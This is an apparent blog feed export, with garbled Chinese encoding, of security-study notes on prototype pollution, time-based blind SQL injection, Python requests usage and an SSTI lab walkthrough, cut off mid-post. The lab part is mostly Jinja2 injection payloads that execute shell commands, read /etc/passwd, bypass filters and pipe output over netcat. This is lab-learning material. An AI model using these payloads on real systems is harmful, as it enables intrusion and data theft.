class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// å®šä¹‰ä¸€ä¸ªåŸå‹å¯¹è±¡</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> myPrototype = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"attr\">sayHello</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;Hello!&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"comment\">// ä½¿ç”¨Object.createå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå¹¶å°†myPrototypeä½œä¸ºå®ƒçš„åŸå‹</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"keyword\">var</span> myObject = <span class=\"title class_\">Object</span>.<span class=\"title function_\">create</span>(myPrototype);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"comment\">// è°ƒç”¨myObjectä¸Šçš„sayHelloæ–¹æ³•</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  myObject.<span class=\"title function_\">sayHello</span>(); <span class=\"comment\">// Hello!</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"5evalå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#5evalå‡½æ•°\">#</a> 5.eval å‡½æ•°</h3>\n<p><code>eval</code>  å‡½æ•°æ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œå®ƒå°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸º JavaScript ä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> myObject = &#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> code = <span class=\"string\">&quot;Object.prototype.isAdmin = &#x27;true&#x27;;&quot;</span>; <span class=\"comment\">// å‘åŸå‹å¯¹è±¡æ·»åŠ å±æ€§</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(code); <span class=\"comment\">// æ‰§è¡Œä»£ç </span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(myObject.<span class=\"property\">isAdmin</span>); <span class=\"comment\">// Hello World</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"äº”åº”ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#äº”åº”ç”¨\">#</a> äº”ã€‚åº”ç”¨</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;)</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "æ—¶é—´ç›²æ³¨",
            "date_published": "2023-05-07T07:33:27.765Z",
            "content_html": "<p>ä¾‹å­çš„è¡¨:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">name</th>\n<th style=\"text-align:center\">url</th>\n<th style=\"text-align:center\">alexa</th>\n<th style=\"text-align:center\">country</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">Google</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNtLw==\">https://www.google.cm/</span></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">æ·˜å®</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFvYmFvLmNvbS8=\">https://www.taobao.com/</span></td>\n<td style=\"text-align:center\">13</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">èœé¸Ÿæ•™ç¨‹</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydW5vb2IuY29tLw==\">http://www.runoob.com/</span></td>\n<td style=\"text-align:center\">10</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">å¾®åš</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3dlaWJvLmNvbS8=\">http://weibo.com/</span></td>\n<td style=\"text-align:center\">20</td>\n<td style=\"text-align:center\">CN</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">5</td>\n<td style=\"text-align:center\">Facebook</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw==\">https://www.facebook.com/</span></td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">USA</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">7</td>\n<td style=\"text-align:center\">stackoverflow</td>\n<td style=\"text-align:center\"><span class=\"exturl\" data-url=\"aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tLw==\">http://stackoverflow.com/</span></td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">IND</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"åŸºæœ¬å»¶æ—¶çš„ç›²æ³¨sleep\"><a class=\"markdownIt-Anchor\" href=\"#åŸºæœ¬å»¶æ—¶çš„ç›²æ³¨sleep\">#</a> åŸºæœ¬å»¶æ—¶çš„ç›²æ³¨:sleep</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from è¡¨å where id=1 and sleep(2);</span><br></pre></td></tr></table></figure>\n<p>é…åˆ if è¯­å¥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(expr1,expr2,expr3)</span><br><span class=\"line\">expr1æ˜¯çœŸ,è¿”å›expr2,å¦åˆ™expr3</span><br><span class=\"line\">select * from websites where name=&#x27;1&#x27; or if(name=&#x27;Facebook&#x27;,sleep(2),null);</span><br><span class=\"line\">åˆ¤æ–­æ˜¯å¦æœ‰ç½‘ç«™åå­—ä¸ºFacebook</span><br></pre></td></tr></table></figure>\n<p>é…åˆæˆªå–å‡½æ•°<br>\n substr (string,start,length)<br>\nmid(string,start,length)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from websites where name=&#x27;2&#x27; or if(substr((select name from websites where id=1),0,1)=&#x27;G&#x27;,sleep(2),0);</span><br></pre></td></tr></table></figure>\n<h3 id=\"1benchmark\"><a class=\"markdownIt-Anchor\" href=\"#1benchmark\">#</a> 1.benchmark()</h3>\n<p>benchmark æ˜¯ MySQL çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œä½œç”¨æ˜¯æµ‹è¯•ä¸€äº›å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦.benchmark ä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…è¡¨è¾¾å¼</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select benchmark(10000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| benchmark(10000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">|                         0 |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">1 row in set (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select benchmark(100000000,md5(&#x27;a&#x27;));</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">| benchmark(100000000,md5(&#x27;a&#x27;)) |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">|                             0 |</span><br><span class=\"line\">+-------------------------------+</span><br><span class=\"line\">1 row in set (14.29 sec)</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œæ¬¡æ•°ä¸åŒï¼Œæ—¶é—´ä¹Ÿä¸åŒï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥ç”¨å®ƒæ¥è¾¾åˆ° sleep çš„å»¶æ—¶ç›®çš„</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),BENCHMARK(10000000,md5(&#x27;a&#x27;)),1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2heavy-query\"><a class=\"markdownIt-Anchor\" href=\"#2heavy-query\">#</a> 2.heavy query</h3>\n<p>é€šè¿‡å¤§é‡çš„æŸ¥è¯¢å¯¼è‡´æŸ¥è¯¢æ—¶é—´å˜é•¿æ¥è¾¾åˆ°å»¶æ—¶ç›®çš„</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from information_schema.tables A,information_schema.tables B;</span><br><span class=\"line\"></span><br><span class=\"line\">select 1 and if((substr(user(),1,1)=&#x27;r&#x27;),(select count(*) from information_schema.tables A,information_schema.tables B;),1);</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/03/request%E5%BA%93/",
            "url": "https://hq185187.github.io/2023/05/03/request%E5%BA%93/",
            "title": "requestså­¦ä¹ ",
            "date_published": "2023-05-03T06:54:19.750Z",
            "content_html": "<h3 id=\"åŸºæœ¬ç”¨æ³•\"><a class=\"markdownIt-Anchor\" href=\"#åŸºæœ¬ç”¨æ³•\">#</a> åŸºæœ¬ç”¨æ³•</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#å¯¼å…¥requestsåº“</span><br><span class=\"line\">import requests</span><br><span class=\"line\">#å‘é€ä¸€ä¸ªgetè¯·æ±‚å¹¶å¾—åˆ°å“åº”</span><br><span class=\"line\">r = requests.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class=\"line\">#æŸ¥çœ‹å“åº”å¯¹è±¡çš„ç±»å‹</span><br><span class=\"line\">print(type(r))</span><br><span class=\"line\">#æŸ¥çœ‹å“åº”çŠ¶æ€ç </span><br><span class=\"line\">print(r.status_code)</span><br><span class=\"line\">#æŸ¥çœ‹å“åº”å†…å®¹çš„ç±»å‹</span><br><span class=\"line\">print(type(r.text))</span><br><span class=\"line\">#æŸ¥çœ‹å“åº”çš„å†…å®¹</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\">#æŸ¥çœ‹cookies</span><br><span class=\"line\">print(r.cookies)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"get\"><a class=\"markdownIt-Anchor\" href=\"#get\">#</a> get</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">\t&#x27;name&#x27;:&#x27;germey&#x27;,</span><br><span class=\"line\">  &#x27;age&#x27;:22</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"postä¼ å‚\"><a class=\"markdownIt-Anchor\" href=\"#postä¼ å‚\">#</a> post ä¼ å‚</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">  &quot;name&quot;:&quot;germey&quot;,</span><br><span class=\"line\">  &quot;age&quot;:&quot;22&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"headersè®¾ç½®\"><a class=\"markdownIt-Anchor\" href=\"#headersè®¾ç½®\">#</a> headers è®¾ç½®</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">  &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;,</span><br><span class=\"line\">  &#x27;my-test&#x27;:&#x27;Hello&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.get(&#x27;http://httpbin.org/get&#x27;,headers=headers)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"çˆ¬å–äºŒè¿›åˆ¶æ•°æ®\"><a class=\"markdownIt-Anchor\" href=\"#çˆ¬å–äºŒè¿›åˆ¶æ•°æ®\">#</a> çˆ¬å–äºŒè¿›åˆ¶æ•°æ®</h3>\n<p>å›¾ç‰‡ï¼ŒéŸ³é¢‘ï¼Œè§†é¢‘è¿™äº›æ–‡ä»¶æœ¬è´¨éƒ½æ˜¯äºŒè¿›åˆ¶ç ç»„æˆçš„ï¼Œè¦çˆ¬å®ƒä»¬ï¼Œè¦æ‹¿åˆ°äºŒè¿›åˆ¶ç  (ä¸‹é¢ä»¥ç™¾åº¦çš„å›¾æ ‡ä¸ºä¾‹å­)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">r=requests.get(<span class=\"string\">&quot;https://www.baidu.com/favicon.ico&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;favicon.ico&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">f.write(r.content)</span><br></pre></td></tr></table></figure>\n<h3 id=\"æ–‡ä»¶ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶ä¸Šä¼ \">#</a> æ–‡ä»¶ä¸Šä¼ </h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">files=&#123;<span class=\"string\">&#x27;file&#x27;</span>:<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;test1.jpg&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)&#125;</span><br><span class=\"line\"><span class=\"comment\">#ä»¥äºŒè¿›åˆ¶æ–¹å¼æ‰“å¼€å½“å‰ç›®å½•çš„test1.jpgæ–‡ä»¶</span></span><br><span class=\"line\">r=requests.post(<span class=\"string\">&#x27;http://httpbin.org/post&#x27;</span>,files=files)</span><br><span class=\"line\"><span class=\"comment\">#è¿›è¡Œä¸Šä¼ </span></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/02/ssti-labs/",
            "url": "https://hq185187.github.io/2023/05/02/ssti-labs/",
            "title": "SSTI-Labs",
            "date_published": "2023-05-02T04:25:19.347Z",
            "content_html": "<h2 id=\"ssti-labs\"><a class=\"markdownIt-Anchor\" href=\"#ssti-labs\">#</a> ssti-labs</h2>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.</h3>\n<p>payload1:(ç”¨å¸¸è§„æ–¹æ³•æ‰¾ shell ç±»)<br>\n(1) å…ˆç”¨è„šæœ¬æ‰¾åŒ…å« builtins çš„ç±»ï¼š128,129,130â€¦<br>\n<mark>python3</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3</span><br><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">python2,æœ‰fileç±»</span><br><span class=\"line\">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2è¿‡æ»¤äº†å¤§æ‹¬å·\"><a class=\"markdownIt-Anchor\" href=\"#2è¿‡æ»¤äº†å¤§æ‹¬å·\">#</a> 2. è¿‡æ»¤äº†å¤§æ‹¬å·</h3>\n<p>å¯ä»¥ç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;%..%&#125;ç»•è¿‡,å¯ä»¥æ‰§è¡Œ..ä¸­çš„pythonä»£ç </span><br><span class=\"line\">ç›´æ¥&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br><span class=\"line\">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;whoami&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3æ²¡æœ‰å›æ˜¾ç›²æ³¨\"><a class=\"markdownIt-Anchor\" href=\"#3æ²¡æœ‰å›æ˜¾ç›²æ³¨\">#</a> 3. æ²¡æœ‰å›æ˜¾ï¼Œç›²æ³¨</h3>\n<p>kali ç»ˆç«¯:nc -lvp 100<br>\n![[Pasted image 20230418234630.png]]<br>\n æ–° payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls|nc 127.0.0.1 100&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4è¿‡æ»¤äº†\"><a class=\"markdownIt-Anchor\" href=\"#4è¿‡æ»¤äº†\">#</a> 4. è¿‡æ»¤äº† []</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å»æœç´¢äº†ä¸€ç•ª</span><br><span class=\"line\"></span><br><span class=\"line\">å‘ç°å­˜åœ¨é­”æœ¯æ–¹æ³•å¯ä»¥ä¸éœ€è¦æ–¹æ‹¬å·æ¥å®ç°</span><br><span class=\"line\"></span><br><span class=\"line\">å³__getitem__</span><br><span class=\"line\">eg.mydict[&#x27;name&#x27;]å¤§è‡´ç­‰åŒäºmydict.__getitem__(&#x27;name&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">ç´¢å¼•æ— æ³•ä½¿ç”¨åªå¥½é€‰æ‹©éå†æ¥åŒ¹é…</span><br><span class=\"line\"></span><br><span class=\"line\">éå†&#x27;&#x27;.__class__.__base__.__subclasses__()æ‰¾åˆ°éœ€è¦çš„æ¨¡å—</span><br><span class=\"line\"></span><br><span class=\"line\">å†åˆå§‹åŒ–åè¿›è¡Œç›¸å…³æ“ä½œ</span><br><span class=\"line\"></span><br><span class=\"line\">pythoné€»è¾‘å¦‚ä¸‹</span><br><span class=\"line\"></span><br><span class=\"line\">for i in &#x27;&#x27;.__class__.__base__.__subclasses__():</span><br><span class=\"line\">    if i.__name__==&#x27;Popen&#x27;</span><br><span class=\"line\">    éœ€è¦æ‰§è¡Œçš„å†…å®¹</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>æ„é€ æˆ payload å°±æ˜¯:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p><mark>ç”¨__getitem__(â€˜osâ€™) ä»£æ›¿ [â€˜osâ€™]</mark></p>\n<p>è¿˜å¯ä»¥ç”¨ getitem ä»£æ›¿ 127 ç»§ç»­ç”¨åŸå§‹å¼å­è§£å‡º:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(127).__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·\"><a class=\"markdownIt-Anchor\" href=\"#5è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·\">#</a> 5. è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·</h3>\n<p>(1). ç”¨ request ä¼ å‚ç»•è¿‡<br>\nå³å¯ä»¥ç”¨ request.values.args æ¥ä»£æ›¿å­—ç¬¦ä¸²</p>\n<p>åŸ payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¿®æ”¹:<br>\n ç”¨ hackbar</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code=&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?arg1=__builtins__&amp;arg2=__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()</span><br></pre></td></tr></table></figure>\n<p>(2).set chr ç»•è¿‡</p>\n<p>&lt;class â€˜warnings.catch_warningsâ€™&gt; ä¸­çš„ chr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flagçš„chr:</span><br><span class=\"line\">chr(102)%2bchr(108)%2bchr(97)%2bchr(103)</span><br></pre></td></tr></table></figure>\n<h3 id=\"6é™åˆ¶äº†ä¸‹åˆ’çº¿\"><a class=\"markdownIt-Anchor\" href=\"#6é™åˆ¶äº†ä¸‹åˆ’çº¿\">#</a> 6. é™åˆ¶äº†ä¸‹åˆ’çº¿</h3>\n<p>(1) request ä¼ å‚ç»•è¿‡<br>\n (2) attr å‡½æ•°åŠ  reques ä¼ å‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;</span><br><span class=\"line\">&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class=\"line\">&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(2)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">postä¼ å‚</span><br><span class=\"line\"></span><br><span class=\"line\">`code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">getä¼ å‚</span><br><span class=\"line\"></span><br><span class=\"line\">`?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()`</span><br></pre></td></tr></table></figure>\n<h3 id=\"7è¿‡æ»¤äº†\"><a class=\"markdownIt-Anchor\" href=\"#7è¿‡æ»¤äº†\">#</a> 7. è¿‡æ»¤äº†.</h3>\n<p>(1) ç”¨ [] ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 